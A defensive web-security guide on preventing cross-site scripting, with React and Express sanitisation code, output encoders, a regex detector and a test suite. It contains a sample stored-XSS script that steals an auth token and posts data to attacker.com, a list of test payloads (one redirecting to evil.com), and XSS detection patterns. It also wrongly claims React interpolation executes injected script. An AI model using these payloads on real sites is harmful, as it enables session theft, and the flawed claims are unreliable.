# XSS Prevention Strategies: Complete Protection Guide

Cross-Site Scripting (XSS) represents one of the most common and dangerous web vulnerabilities, affecting 84% of web applications according to OWASP 2023 data. This comprehensive guide provides practical strategies for preventing all types of XSS attacks in modern frontend applications.

## Understanding XSS Attack Vectors

### Types of XSS Attacks

#### 1. Stored XSS (Persistent)
- **Description**: Malicious script stored in database and executed when content is displayed
- **Risk Level**: Critical - affects all users viewing the content
- **Common Targets**: User profiles, comments, forum posts, reviews

```typescript
// Vulnerable code example
const UserComment: React.FC<{ comment: string }> = ({ comment }) => {
  // DANGEROUS: Direct HTML insertion without sanitization
  return <div dangerouslySetInnerHTML={{ __html: comment }} />;
};

// Attack payload example
const maliciousComment = `
  <script>
    // Steal authentication tokens
    fetch('/api/user/data', {
      headers: { 'Authorization': localStorage.getItem('token') }
    }).then(response => response.json())
    .then(data => {
      // Send stolen data to attacker's server
      fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
      });
    });
  </script>
  Great article!
`;
```

#### 2. Reflected XSS (Non-Persistent)
- **Description**: Malicious script reflected from user input in URL parameters or form data
- **Risk Level**: High - affects users who click malicious links
- **Common Targets**: Search results, error messages, URL parameters

```typescript
// Vulnerable search component
const SearchResults: React.FC<{ query: string }> = ({ query }) => {
  // DANGEROUS: Direct display of user input
  return (
    <div>
      <h2>Search results for: {query}</h2>
      {/* If query contains <script>, it will execute */}
    </div>
  );
};

// Attack URL example
// https://example.com/search?q=<script>alert('XSS')</script>
```

#### 3. DOM-Based XSS
- **Description**: JavaScript modifies DOM based on user input without proper validation
- **Risk Level**: High - client-side vulnerability independent of server response
- **Common Targets**: Single-page applications, dynamic content generation

```typescript
// Vulnerable DOM manipulation
const updateContent = (userInput: string) => {
  // DANGEROUS: Direct DOM manipulation with user input
  document.getElementById('content')!.innerHTML = `
    <h3>Welcome ${userInput}</h3>
  `;
};

// Attack payload
// updateContent('</h3><script>maliciousCode()</script>');
```

## Comprehensive XSS Prevention Strategies

### 1. Input Sanitization with DOMPurify

#### Advanced DOMPurify Configuration

```typescript
// utils/advancedSanitizer.ts
import DOMPurify from 'dompurify';

export interface SanitizationLevel {
  level: 'strict' | 'moderate' | 'permissive';
  customConfig?: DOMPurify.Config;
}

export class AdvancedXSSSanitizer {
  private static readonly SECURITY_PROFILES: Record<string, DOMPurify.Config> = {
    strict: {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
      ALLOWED_ATTR: [],
      STRIP_IGNORE_TAG: true,
      STRIP_IGNORE_TAG_BODY: ['script', 'style'],
      ALLOW_DATA_ATTR: false,
      ALLOW_UNKNOWN_PROTOCOLS: false,
      SANITIZE_DOM: true,
      KEEP_CONTENT: false
    },
    
    moderate: {
      ALLOWED_TAGS: [
        'b', 'i', 'em', 'strong', 'u', 's', 'p', 'br',
        'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
        'ul', 'ol', 'li', 'blockquote', 'a'
      ],
      ALLOWED_ATTR: ['href', 'title', 'target'],
      STRIP_IGNORE_TAG: true,
      ALLOW_DATA_ATTR: false,
      SANITIZE_DOM: true,
      FORBID_ATTR: ['style', 'onclick', 'onload', 'onerror']
    },
    
    permissive: {
      ALLOWED_TAGS: [
        'b', 'i', 'em', 'strong', 'u', 's', 'p', 'br', 'div', 'span',
        'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
        'ul', 'ol', 'li', 'blockquote', 'a', 'img',
        'table', 'thead', 'tbody', 'tr', 'td', 'th',
        'pre', 'code'
      ],
      ALLOWED_ATTR: [
        'href', 'title', 'target', 'src', 'alt', 'width', 'height',
        'class', 'id'
      ],
      STRIP_IGNORE_TAG: true,
      ALLOW_DATA_ATTR: false,
      SANITIZE_DOM: true,
      FORBID_ATTR: [
        'style', 'onclick', 'onload', 'onerror', 'onmouseover',
        'onfocus', 'onblur', 'onchange', 'onsubmit'
      ]
    }
  };

  static sanitize(
    input: string, 
    config: SanitizationLevel = { level: 'moderate' }
  ): string {
    if (!input || typeof input !== 'string') {
      return '';
    }

    const sanitizationConfig = config.customConfig || 
                               this.SECURITY_PROFILES[config.level];

    // Add hooks for additional security
    DOMPurify.addHook('beforeSanitizeElements', (node) => {
      // Remove any script tags, even if somehow allowed
      if (node.tagName === 'SCRIPT') {
        node.remove();
        return node;
      }
      
      // Check for suspicious attributes
      if (node.attributes) {
        Array.from(node.attributes).forEach(attr => {
          if (attr.name.toLowerCase().startsWith('on') || 
              attr.value.toLowerCase().includes('javascript:')) {
            node.removeAttribute(attr.name);
          }
        });
      }
      
      return node;
    });

    const sanitized = DOMPurify.sanitize(input, sanitizationConfig);
    
    // Additional validation for URL-based attacks
    if (sanitized.includes('javascript:') || 
        sanitized.includes('data:text/html') ||
        sanitized.includes('vbscript:')) {
      return this.sanitize(input, { level: 'strict' });
    }

    return sanitized;
  }

  static sanitizeForContext(input: string, context: string): string {
    const contextConfigs: Record<string, SanitizationLevel> = {
      'user-bio': { level: 'permissive' },
      'comment': { level: 'moderate' },
      'search-term': { level: 'strict' },
      'user-name': { level: 'strict' },
      'rich-editor': { level: 'permissive' },
      'notification': { level: 'strict' }
    };

    return this.sanitize(input, contextConfigs[context] || { level: 'strict' });
  }

  static validateAndSanitizeURL(url: string): string | null {
    // Whitelist allowed protocols
    const allowedProtocols = ['http:', 'https:', 'mailto:'];
    
    try {
      const urlObj = new URL(url);
      if (!allowedProtocols.includes(urlObj.protocol)) {
        return null;
      }
      
      // Sanitize the URL string
      return this.sanitize(url, { level: 'strict' });
    } catch (error) {
      return null;
    }
  }
}
```

#### React Components with XSS Protection

```typescript
// components/SecureComponents.tsx
import React, { useMemo } from 'react';
import { AdvancedXSSSanitizer } from '../utils/advancedSanitizer';

interface SecureContentProps {
  content: string;
  context: string;
  className?: string;
  allowHTML?: boolean;
}

export const SecureContent: React.FC<SecureContentProps> = ({
  content,
  context,
  className = '',
  allowHTML = false
}) => {
  const sanitizedContent = useMemo(() => {
    if (!allowHTML) {
      // For plain text, escape all HTML
      return content.replace(/[<>&"']/g, (char) => {
        const entityMap: Record<string, string> = {
          '<': '&lt;',
          '>': '&gt;',
          '&': '&amp;',
          '"': '&quot;',
          "'": '&#x27;'
        };
        return entityMap[char];
      });
    }
    
    return AdvancedXSSSanitizer.sanitizeForContext(content, context);
  }, [content, context, allowHTML]);

  if (!allowHTML) {
    return <div className={className}>{sanitizedContent}</div>;
  }

  return (
    <div 
      className={className}
      dangerouslySetInnerHTML={{ __html: sanitizedContent }}
    />
  );
};

// Secure link component
interface SecureLinkProps {
  href: string;
  children: React.ReactNode;
  className?: string;
  target?: string;
}

export const SecureLink: React.FC<SecureLinkProps> = ({
  href,
  children,
  className = '',
  target = '_self'
}) => {
  const sanitizedHref = useMemo(() => {
    return AdvancedXSSSanitizer.validateAndSanitizeURL(href);
  }, [href]);

  if (!sanitizedHref) {
    // Return plain text if URL is invalid
    return <span className={className}>{children}</span>;
  }

  return (
    <a 
      href={sanitizedHref}
      className={className}
      target={target}
      rel={target === '_blank' ? 'noopener noreferrer' : undefined}
    >
      {children}
    </a>
  );
};

// Secure form input component
interface SecureInputProps {
  value: string;
  onChange: (value: string) => void;
  placeholder?: string;
  maxLength?: number;
  context: string;
  validateOnChange?: boolean;
}

export const SecureInput: React.FC<SecureInputProps> = ({
  value,
  onChange,
  placeholder = '',
  maxLength = 500,
  context,
  validateOnChange = true
}) => {
  const handleChange = (event: React.ChangeEvent<HTMLInputElement>) => {
    let newValue = event.target.value;
    
    if (validateOnChange) {
      // Real-time sanitization for immediate feedback
      newValue = AdvancedXSSSanitizer.sanitizeForContext(newValue, context);
    }
    
    onChange(newValue);
  };

  return (
    <input
      type="text"
      value={value}
      onChange={handleChange}
      placeholder={placeholder}
      maxLength={maxLength}
      className="secure-input"
    />
  );
};
```

### 2. Output Encoding Strategies

#### Context-Aware Output Encoding

```typescript
// utils/outputEncoder.ts
export class OutputEncoder {
  // HTML context encoding
  static encodeHTML(input: string): string {
    return input.replace(/[<>&"']/g, (char) => {
      const htmlEntities: Record<string, string> = {
        '<': '&lt;',
        '>': '&gt;',
        '&': '&amp;',
        '"': '&quot;',
        "'": '&#x27;'
      };
      return htmlEntities[char];
    });
  }

  // HTML attribute encoding
  static encodeHTMLAttribute(input: string): string {
    return input.replace(/[&<>"']/g, (char) => {
      const attrEntities: Record<string, string> = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#x27;'
      };
      return attrEntities[char];
    });
  }

  // JavaScript context encoding
  static encodeJavaScript(input: string): string {
    return input.replace(/[\\'"<>&\r\n\u2028\u2029]/g, (char) => {
      const jsEntities: Record<string, string> = {
        '\\': '\\\\',
        "'": "\\'",
        '"': '\\"',
        '<': '\\u003C',
        '>': '\\u003E',
        '&': '\\u0026',
        '\r': '\\r',
        '\n': '\\n',
        '\u2028': '\\u2028',  // Line separator
        '\u2029': '\\u2029'   // Paragraph separator
      };
      return jsEntities[char];
    });
  }

  // CSS context encoding
  static encodeCSS(input: string): string {
    return input.replace(/[<>&"'\\]/g, (char) => {
      return '\\' + char.charCodeAt(0).toString(16).padStart(6, '0');
    });
  }

  // URL encoding
  static encodeURL(input: string): string {
    return encodeURIComponent(input);
  }

  // Context-aware encoding
  static encodeForContext(input: string, context: 'html' | 'attr' | 'js' | 'css' | 'url'): string {
    switch (context) {
      case 'html':
        return this.encodeHTML(input);
      case 'attr':
        return this.encodeHTMLAttribute(input);
      case 'js':
        return this.encodeJavaScript(input);
      case 'css':
        return this.encodeCSS(input);
      case 'url':
        return this.encodeURL(input);
      default:
        return this.encodeHTML(input);
    }
  }
}

// React hook for context-aware encoding
export const useSecureOutput = (value: string, context: string) => {
  return useMemo(() => {
    return OutputEncoder.encodeForContext(value, context as any);
  }, [value, context]);
};
```

### 3. Server-Side XSS Prevention

#### Express.js XSS Protection Middleware

```typescript
// middleware/xssProtection.ts
import { Request, Response, NextFunction } from 'express';
import { AdvancedXSSSanitizer } from '../utils/advancedSanitizer';

interface XSSProtectionOptions {
  sanitizeBody?: boolean;
  sanitizeQuery?: boolean;
  sanitizeParams?: boolean;
  excludePaths?: string[];
  contextMap?: Record<string, string>;
}

export const xssProtection = (options: XSSProtectionOptions = {}) => {
  const {
    sanitizeBody = true,
    sanitizeQuery = true,
    sanitizeParams = true,
    excludePaths = [],
    contextMap = {}
  } = options;

  return (req: Request, res: Response, next: NextFunction) => {
    // Skip protection for excluded paths
    if (excludePaths.some(path => req.path.includes(path))) {
      return next();
    }

    try {
      // Sanitize request body
      if (sanitizeBody && req.body) {
        req.body = sanitizeObject(req.body, 'body', contextMap);
      }

      // Sanitize query parameters
      if (sanitizeQuery && req.query) {
        req.query = sanitizeObject(req.query, 'query', contextMap);
      }

      // Sanitize route parameters
      if (sanitizeParams && req.params) {
        req.params = sanitizeObject(req.params, 'params', contextMap);
      }

      next();
    } catch (error) {
      console.error('XSS protection middleware error:', error);
      res.status(400).json({
        success: false,
        message: 'Invalid input detected',
        code: 'XSS_PROTECTION_TRIGGERED'
      });
    }
  };
};

function sanitizeObject(
  obj: any, 
  source: string, 
  contextMap: Record<string, string>
): any {
  if (!obj || typeof obj !== 'object') {
    return obj;
  }

  const sanitized: any = Array.isArray(obj) ? [] : {};

  for (const [key, value] of Object.entries(obj)) {
    if (typeof value === 'string') {
      const context = contextMap[`${source}.${key}`] || 'strict';
      sanitized[key] = AdvancedXSSSanitizer.sanitizeForContext(value, context);
    } else if (typeof value === 'object' && value !== null) {
      sanitized[key] = sanitizeObject(value, `${source}.${key}`, contextMap);
    } else {
      sanitized[key] = value;
    }
  }

  return sanitized;
}

// Usage example
app.use(xssProtection({
  contextMap: {
    'body.bio': 'permissive',
    'body.comment': 'moderate',
    'body.name': 'strict',
    'query.search': 'strict'
  },
  excludePaths: ['/api/upload', '/api/raw-data']
}));
```

### 4. Advanced XSS Detection and Prevention

#### Real-time XSS Detection

```typescript
// utils/xssDetector.ts
export class XSSDetector {
  private static readonly XSS_PATTERNS = [
    // Script tags
    /<script[^>]*>.*?<\/script>/gims,
    
    // Event handlers
    /on\w+\s*=\s*["\'].*?["\']/gims,
    
    // JavaScript URLs
    /href\s*=\s*["\']javascript:/gims,
    
    // Data URLs with scripts
    /src\s*=\s*["\']data:text\/html/gims,
    
    // Expression() calls
    /expression\s*\(/gims,
    
    // Vbscript
    /vbscript:/gims,
    
    // IMG with onerror
    /<img[^>]+onerror/gims,
    
    // SVG with script
    /<svg[^>]*>.*?<script/gims,
    
    // Base64 encoded scripts
    /data:text\/html;base64/gims
  ];

  static detectXSS(input: string): {
    isXSS: boolean;
    confidence: number;
    patterns: string[];
    sanitizedInput: string;
  } {
    if (!input || typeof input !== 'string') {
      return {
        isXSS: false,
        confidence: 0,
        patterns: [],
        sanitizedInput: input || ''
      };
    }

    const detectedPatterns: string[] = [];
    let confidence = 0;

    // Check against known XSS patterns
    for (const pattern of this.XSS_PATTERNS) {
      if (pattern.test(input)) {
        detectedPatterns.push(pattern.source);
        confidence += 0.2;
      }
    }

    // Additional heuristic checks
    const suspiciousKeywords = [
      'alert(', 'confirm(', 'prompt(', 'eval(',
      'document.cookie', 'localStorage', 'sessionStorage',
      'innerHTML', 'outerHTML', 'document.write'
    ];

    for (const keyword of suspiciousKeywords) {
      if (input.toLowerCase().includes(keyword.toLowerCase())) {
        detectedPatterns.push(`keyword: ${keyword}`);
        confidence += 0.1;
      }
    }

    // Entropy analysis for obfuscated scripts
    const entropy = this.calculateEntropy(input);
    if (entropy > 4.5 && input.length > 50) {
      detectedPatterns.push('high entropy (possible obfuscation)');
      confidence += 0.3;
    }

    const isXSS = confidence > 0.3;
    const sanitizedInput = isXSS ? 
      AdvancedXSSSanitizer.sanitize(input, { level: 'strict' }) : 
      input;

    return {
      isXSS,
      confidence: Math.min(confidence, 1.0),
      patterns: detectedPatterns,
      sanitizedInput
    };
  }

  private static calculateEntropy(str: string): number {
    const frequencies: Record<string, number> = {};
    
    for (const char of str) {
      frequencies[char] = (frequencies[char] || 0) + 1;
    }

    let entropy = 0;
    const length = str.length;

    for (const freq of Object.values(frequencies)) {
      const probability = freq / length;
      entropy -= probability * Math.log2(probability);
    }

    return entropy;
  }

  static createXSSLogger() {
    return (detection: ReturnType<typeof XSSDetector.detectXSS>) => {
      if (detection.isXSS) {
        console.warn('XSS attempt detected:', {
          confidence: detection.confidence,
          patterns: detection.patterns,
          timestamp: new Date().toISOString(),
          // Don't log the actual malicious input for security
          inputLength: detection.sanitizedInput.length
        });
      }
    };
  }
}
```

### 5. Testing XSS Prevention

#### Comprehensive XSS Testing Suite

```typescript
// tests/xss-prevention.test.ts
import { AdvancedXSSSanitizer } from '../utils/advancedSanitizer';
import { XSSDetector } from '../utils/xssDetector';
import { OutputEncoder } from '../utils/outputEncoder';

describe('XSS Prevention Suite', () => {
  describe('Input Sanitization', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(\'XSS\')">',
      '<svg onload="alert(1)">',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<body onload="alert(\'XSS\')">',
      '<div onclick="alert(\'XSS\')">Click me</div>',
      '"><script>alert("XSS")</script>',
      '\');alert(\'XSS\');//',
      '<script>document.location="http://evil.com"</script>'
    ];

    xssPayloads.forEach((payload, index) => {
      it(`should sanitize XSS payload ${index + 1}`, () => {
        const sanitized = AdvancedXSSSanitizer.sanitize(payload, { level: 'strict' });
        
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('alert(');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('onerror=');
        expect(sanitized).not.toContain('onload=');
        expect(sanitized).not.toContain('onclick=');
      });
    });

    it('should preserve safe content', () => {
      const safeContent = '<p>This is <strong>safe</strong> content with <em>emphasis</em>.</p>';
      const sanitized = AdvancedXSSSanitizer.sanitize(safeContent, { level: 'moderate' });
      
      expect(sanitized).toContain('<p>');
      expect(sanitized).toContain('<strong>');
      expect(sanitized).toContain('<em>');
      expect(sanitized).toContain('safe');
    });
  });

  describe('XSS Detection', () => {
    it('should detect script-based XSS', () => {
      const maliciousInput = '<script>alert("XSS")</script>';
      const detection = XSSDetector.detectXSS(maliciousInput);
      
      expect(detection.isXSS).toBe(true);
      expect(detection.confidence).toBeGreaterThan(0.3);
      expect(detection.patterns.length).toBeGreaterThan(0);
    });

    it('should detect event handler XSS', () => {
      const maliciousInput = '<img src="x" onerror="alert(1)">';
      const detection = XSSDetector.detectXSS(maliciousInput);
      
      expect(detection.isXSS).toBe(true);
      expect(detection.confidence).toBeGreaterThan(0.3);
    });

    it('should not flag safe content as XSS', () => {
      const safeInput = 'This is normal text with <b>bold</b> formatting.';
      const detection = XSSDetector.detectXSS(safeInput);
      
      expect(detection.isXSS).toBe(false);
      expect(detection.confidence).toBeLessThan(0.3);
    });
  });

  describe('Output Encoding', () => {
    it('should properly encode for HTML context', () => {
      const input = '<script>alert("XSS")</script>';
      const encoded = OutputEncoder.encodeHTML(input);
      
      expect(encoded).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;');
    });

    it('should properly encode for JavaScript context', () => {
      const input = 'alert("XSS");';
      const encoded = OutputEncoder.encodeJavaScript(input);
      
      expect(encoded).toContain('\\"');
      expect(encoded).not.toContain('alert("');
    });

    it('should properly encode URLs', () => {
      const input = 'javascript:alert("XSS")';
      const encoded = OutputEncoder.encodeURL(input);
      
      expect(encoded).toContain('%3A'); // Encoded colon
      expect(encoded).not.toContain('javascript:');
    });
  });

  describe('Integration Tests', () => {
    it('should handle complex nested XSS attempts', () => {
      const complexPayload = `
        <div>
          Normal content
          <script>alert('XSS')</script>
          <img src="x" onerror="alert('Another XSS')">
          <a href="javascript:alert('Yet another XSS')">Click</a>
        </div>
      `;
      
      const detection = XSSDetector.detectXSS(complexPayload);
      expect(detection.isXSS).toBe(true);
      
      const sanitized = AdvancedXSSSanitizer.sanitize(complexPayload, { level: 'moderate' });
      expect(sanitized).toContain('Normal content');
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('onerror=');
      expect(sanitized).not.toContain('javascript:');
    });
  });
});
```

## XSS Prevention Checklist

### Development Phase
- [ ] **Input Sanitization**: All user inputs sanitized with DOMPurify
- [ ] **Output Encoding**: Context-aware encoding for all dynamic content
- [ ] **URL Validation**: All URLs validated against whitelist protocols
- [ ] **Rich Text Editor**: Secure configuration with limited tag allowlist
- [ ] **Form Validation**: Client and server-side validation implemented
- [ ] **File Upload**: File type and content validation for uploads
- [ ] **Template Security**: Template engine configured to auto-escape by default

### Testing Phase
- [ ] **Automated Testing**: XSS test suite covers all input vectors
- [ ] **Penetration Testing**: Manual XSS testing with common payloads
- [ ] **Code Review**: Security-focused code review for XSS vulnerabilities
- [ ] **Dependency Scanning**: All dependencies scanned for XSS vulnerabilities
- [ ] **Browser Testing**: Cross-browser XSS prevention verification

### Production Phase
- [ ] **Content Security Policy**: CSP headers configured to prevent XSS
- [ ] **Monitoring**: XSS attempt detection and logging implemented
- [ ] **Error Handling**: No sensitive data exposed in error messages
- [ ] **Regular Updates**: Security patches applied promptly
- [ ] **Incident Response**: XSS incident response plan documented and tested

## Additional Resources

### Official Documentation
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN Web Security Guidelines](https://developer.mozilla.org/en-US/docs/Web/Security)
- [Google Web Security Best Practices](https://developers.google.com/web/fundamentals/security/)

### Security Tools
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)
- [OWASP ZAP Security Scanner](https://www.zaproxy.org/)
- [Burp Suite XSS Testing](https://portswigger.net/burp)

### Educational Resources
- [XSS Game by Google](https://xss-game.appspot.com/)
- [OWASP WebGoat XSS Lessons](https://webgoat.github.io/WebGoat/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/cross-site-scripting)

---

## Navigation

- ← Back to: [Frontend Security Best Practices](./README.md)
- → Next: [CSRF Protection Methods](./csrf-protection-methods.md)
- → Related: [Content Security Policy Guide](./content-security-policy-guide.md)
- → Implementation: [Implementation Guide](./implementation-guide.md)